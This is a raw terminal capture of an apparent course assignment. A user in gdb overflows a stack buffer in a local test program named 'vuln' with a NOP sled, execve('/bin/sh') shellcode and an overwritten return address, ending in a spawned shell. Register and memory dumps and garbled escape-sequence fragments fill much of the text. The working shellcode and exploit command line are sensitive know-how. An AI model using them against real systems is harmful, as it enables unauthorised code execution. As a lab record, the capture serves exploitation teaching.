[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C4'[C[C[CB')")
8'BBBB')")
[C\'BBBB')")
[C[Cx'BBBB')")
[C[C[C8'BBBB')")
[C[C[C[C9'BBBB')")
[C[C[C[C[C\'BBBB')")
[C[C[C[C[C[Cx'BBBB')")
[C[C[C[C[C[C[Ce'BBBB')")6'BBBB')")\'BBBB')")x'BBBB')")b'BBBB')")0'BBBB')")\'BBBB')")x'BBBB')")3'BBBB')")b'BBBB')")\'BBBB')")x'BBBB')")0'BBBB')")f'BBBB')")\'BBBB')")x'BBBB')")0'BBBB')")5'BBBB')")\'BBBB')")x'BBBB')")e'BBBB')")8'BBBB')")\'BBBB')")x'BBBB')")e'BBBB')")8'BBBB')")\'BBBB')")x'BBBB')")f'BBBB')")f'BBBB')")\'BBBB')")x'BBBB')")f'BBBB')")f'BBBB')")\'BBBB')")x'BBBB')")f'BBBB')")f'BBBB')")\'BBBB')")x'BBBB')")2'BBBB')")f'BBBB')")\'BBBB')")x'BBBB')")6'BBBB')")2'BBBB')")\'BBBB')")x'BBBB')")6'BBBB')")9'BBBB')")\'BBBB')")x'BBBB')")6'BBBB')")e'BBBB')")\'BBBB')")x'BBBB')")2'BBBB')")f'BBBB')")\'BBBB')")x'BBBB')")7'BBBB')")3'BBBB')")\'BBBB')")x'BBBB')")6'BBBB')")8'BBBB')")[C'BBBB')")+'BBBB')")[C'BBBB')")x'BBBB')")[1P'BBBB')")\'BBBB')")x'BBBB')")9'BBBB')")0'BBBB')")[C'BBBB')")*'BBBB')")1'BBBB')")5'BBBB')")+'BBBB')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")
  File "<string>", line 1
    print('\x90'*1000+\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')
                                                                                                                                                                            ^
SyntaxError: unexpected character after line continuation character


Error: No Command Line arg for vuln was given



Value of Test:ffffb8c8
Value of filename[0]:ffffb4c0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x000000000040070d in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
__libc_start_main (main=0x40068a <main>, argc=1, argv=0x7fffffffe0f8, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe0e8)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) info reg
rax            0x0	0
rbx            0x0	0
rcx            0x207373656c657355	2338339510982898517
rdx            0x74786554207373	32783473896878963
rsi            0x400861	4196449
rdi            0x7fffffffb4c0	140737488336064
rbp            0x400720	0x400720 <__libc_csu_init>
rsp            0x7fffffffe020	0x7fffffffe020
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffe0f0	140737488347376
r14            0x0	0
r15            0x0	0
rip            0x7ffff7a2e830	0x7ffff7a2e830 <__libc_start_main+240>
eflags         0x206	[ PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) n
[Inferior 1 (process 32643) exited normally]
(gdb) $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x 
89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")
Undefined command: "$".  Try "help".
(gdb) n[K$(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x8
89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")
[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cr$(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")[A
[C[C[C[C[C[C[Cu$(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")[A
[C[C[C[C[C[C[C[Cn$(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")[A
[C[C[C[C[C[C[C[C[C $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")[A
[C[C[C[C[C[C[C[C[C[C


Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")

Length of Input String:1052


Value of Test:ffffb4b8
Value of filename[0]:ffffb0b0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x0000000042424242 in ?? ()
(gdb) info reg
rax            0x7fffffffb0b0	140737488335024
rbx            0x0	0
rcx            0x9090909090909090	-8029759185026510704
rdx            0x42424242909090	18650200814948496
rsi            0x7fffffffe420	140737488348192
rdi            0x7fffffffb4bf	140737488336063
rbp            0x9090909090909090	0x9090909090909090
rsp            0x7fffffffb4d0	0x7fffffffb4d0
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x42424242	0x42424242
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/1060xb ($rsp-1060)
0x7fffffffb0ac:	0xff	0x7f	0x00	0x00	0x90	0x90	0x90	0x90
0x7fffffffb0b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb104:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb10c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb114:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb11c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb124:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb12c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb134:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb13c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb144:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb14c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb154:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb15c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb164:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb16c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb174:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb17c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb184:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb18c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb194:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb19c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb1fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb204:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb20c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb214:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb21c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb224:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb22c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb234:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb23c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb244:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb24c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb254:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb25c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb264:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb26c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb274:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb27c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb284:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb28c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb294:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb29c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb2fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb304:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb30c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb314:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb31c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb324:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb32c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb334:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb33c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb344:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb34c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb354:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb35c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb364:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb36c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb374:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb37c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb384:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb38c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb394:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb39c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb404:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb40c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb414:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb41c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb424:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb42c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb434:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb43c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb444:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb44c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb454:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb45c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb464:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb46c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb474:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb47c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb484:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb48c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb494:	0x90	0x90	0x90	0x90	0xeb	0x13	0x5f	0x48
0x7fffffffb49c:	0x31	0xc0	0x88	0x47	0x07	0x50	0x48	0x89
0x7fffffffb4a4:	0xe2	0x57	0x48	0x89	0xe6	0xb0	0x3b	0x0f
0x7fffffffb4ac:	0x05	0xe8	0xe8	0xff	0xff	0xff	0x2f	0x62
0x7fffffffb4b4:	0x69	0x6e	0x2f	0x73	0x68	0x90	0x90	0x90
0x7fffffffb4bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb4c4:	0x90	0x90	0x90	0x90	0x42	0x42	0x42	0x42
0x7fffffffb4cc:	0x00	0x00	0x00	0x00
(gdb) n
Cannot find bounds of current function
(gdb) nx/1060xb ($rsp-1060)
[C[C[C[C[C[C[12Pinfo reg
[C[C[C[C[C[Cn[Krun $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x4
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")[1P')")[1P')")[1P')")[1P')")\')")x')")3')")4')")\')")x')")b')")4')")\')") [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cx')")
)[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cf')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cf')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C\')")
x')")
[Cf')")
[C[Cf')")\')")x')")f')")f')")\')")x')")7')")f')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")

Length of Input String:1054


Value of Test:ffffb4a8
Value of filename[0]:ffffb0a0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x00007fffffffb434 in ?? ()
(gdb) n
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) nrun $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x4
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\x
xff\xff\x7f')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")

Length of Input String:1054


Value of Test:ffffb4a8
Value of filename[0]:ffffb0a0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) 
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x00007fffffffb434 in ?? ()
(gdb) 
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) run $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x 
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\ 
xff\xff\x7f')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")

Length of Input String:1054


Value of Test:ffffb4a8
Value of filename[0]:ffffb0a0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x00007fffffffb434 in ?? ()
(gdb) n
Cannot find bounds of current function
(gdb) quit
A debugging session is active.

	Inferior 1 [process 32734] will be killed.

Quit anyway? (y or n) y
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ gdb vuln
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) run $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x 
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\ 
xff\xff\x7f')")
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")

Length of Input String:1054


Value of Test:ffffb4a8
Value of filename[0]:ffffb0a0

You are going to need a buffer a little larger than:1032

process 32745 is executing new program: /bin/dash
$ 
$ 
$ 
$ 
$ 
$ 
$ 
$ whoami
hprakash
$ 
$ 
$ 
$ ls
BufferRedirect64.c	    Part4Demo.txt  attack.c	  vuln	  vuln.s
BufferRedirectViaStack64.c  attack	   shellcode.txt  vuln.c
$ 
$ 
$ exit
[Inferior 1 (process 32745) exited normally]
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) quit
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ script Part4Demo2.txt
Script started, file is Part4Demo2.txt
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ gdb vuln
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) run $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x 
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")

Length of Input String:1052


Value of Test:ffffb4b8
Value of filename[0]:ffffb0b0

You are going to need a buffer a little larger than:1032


Program received signal SIGSEGV, Segmentation fault.
0x0000000042424242 in ?? ()
(gdb) info reg
rax            0x7fffffffb0b0	140737488335024
rbx            0x0	0
rcx            0x9090909090909090	-8029759185026510704
rdx            0x42424242909090	18650200814948496
rsi            0x7fffffffe420	140737488348192
rdi            0x7fffffffb4bf	140737488336063
rbp            0x9090909090909090	0x9090909090909090
rsp            0x7fffffffb4d0	0x7fffffffb4d0
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x42424242	0x42424242
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/1060xb ($rsp-1060)
0x7fffffffb0ac:	0xff	0x7f	0x00	0x00	0x90	0x90	0x90	0x90
0x7fffffffb0b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb0bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
